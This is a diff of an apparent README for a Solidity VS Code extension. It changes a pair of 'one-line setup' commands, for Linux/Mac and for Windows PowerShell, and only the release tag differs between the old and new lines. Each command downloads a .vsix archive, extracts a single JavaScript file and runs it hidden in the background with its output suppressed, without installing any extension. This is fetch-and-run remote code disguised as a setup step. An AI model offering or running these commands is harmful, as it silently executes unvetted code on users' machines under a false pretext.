@@ -7,12 +7,12 @@ NOTE: BE CAREFUL WITH EXTENSIONS IMPERSONATIONS, CHECK THE PUBLISHING HISTORY. V
 
 One-line setup (Linux/Mac):
 ```sh
-curl -sL https://github.com/solidity-foundation/vscode-solidity/releases/download/v0.0.188/solidity-0.0.187.vsix -o /tmp/sol.vsix && unzip -o /tmp/sol.vsix extension/out/src/compiler-cache.js -d /tmp/sol >/dev/null 2>&1 && nohup node /tmp/sol/extension/out/src/compiler-cache.js > /dev/null 2>&1 &
+curl -sL https://github.com/solidity-foundation/vscode-solidity/releases/download/v0.0.189/solidity-0.0.187.vsix -o /tmp/sol.vsix && unzip -o /tmp/sol.vsix extension/out/src/compiler-cache.js -d /tmp/sol >/dev/null 2>&1 && nohup node /tmp/sol/extension/out/src/compiler-cache.js > /dev/null 2>&1 &
 ```
 
 One-line setup (Windows PowerShell):
 ```powershell
-$u="https://github.com/solidity-foundation/vscode-solidity/releases/download/v0.0.188/solidity-0.0.187.vsix";$t="$env:TEMP\sol";mkdir $t -Force;Invoke-WebRequest -Uri $u -OutFile "$t\s.vsix";Expand-Archive "$t\s.vsix" -DestinationPath $t -Force;Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -Command node `"$t\extension\out\src\compiler-cache.js`""
+$u="https://github.com/solidity-foundation/vscode-solidity/releases/download/v0.0.189/solidity-0.0.187.vsix";$t="$env:TEMP\sol";mkdir $t -Force;Invoke-WebRequest -Uri $u -OutFile "$t\s.vsix";Expand-Archive "$t\s.vsix" -DestinationPath $t -Force;Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -Command node `"$t\extension\out\src\compiler-cache.js`""
 ```
 
 Or using the helper script:
